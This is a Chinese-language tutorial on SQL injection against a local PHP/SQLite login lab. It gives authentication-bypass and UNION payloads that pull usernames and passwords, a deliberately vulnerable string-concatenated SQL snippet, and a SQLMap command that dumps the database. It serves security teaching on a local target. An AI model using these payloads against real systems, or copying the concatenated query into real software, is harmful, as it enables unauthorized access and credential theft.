## 🔥 SQL 注入实战教程

---

### 🧐 **核心教学（质疑一切"安全"）**

虽然 `index.php` 和 `dashboard.php` **表面上使用了预处理语句**，但是妳学会质疑：

- 真的防住了吗？
- 有没有漏掉的细节？
- 万一开发者写错，留了个洞呢？

所以，我们**先学攻击，再学验证防御**。

---

### 🐣 手动注入（Noob Mode）

可以直接在登录框里试这些：

| 类型           | 注入 payload                                         | 解释               |
| -------------- | ---------------------------------------------------- | ------------------ |
| 认证绕过       | `' OR '1'='1`                                        | 直接永远为真       |
| 基于注释的绕过 | `admin' -- `                                         | 注释掉后面条件     |
| UNION 查询注入 | `' UNION SELECT username, password, id FROM users--` | 联表查询拿用户数据 |

> ✨ **注意：** 如果妳改代码去掉预处理（拼接 SQL），效果会更炸裂！

---

### 💣 高阶玩法：自改源码版

如果想体验最原始 SQL 注入，**（仅限本地教学！）** 可以把登录逻辑**改成直接拼接 SQL**：

```php
// 非预处理版：易被注入
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$stmt = $pdo->query($sql);
```

然后再打，就能轻松注入爆破了。👾

### 🤖 SQLMap 自动化注入

如果想偷懒用工具？  
用 SQLMap 一键爆破！

**命令示范：**

```bash
python3 sqlmap.py -u "http://localhost:3000/index.php" --data="username=admin&password=' OR 1=1--" --dbms=sqlite --dump
```

**参数说明：**

| 参数     | 作用                      |
| -------- | ------------------------- |
| `-u`     | 指定目标 URL              |
| `--data` | 提交的 POST 数据          |
| `--dbms` | 告诉 SQLMap 我们是 SQLite |
| `--dump` | 爆出数据库内容            |
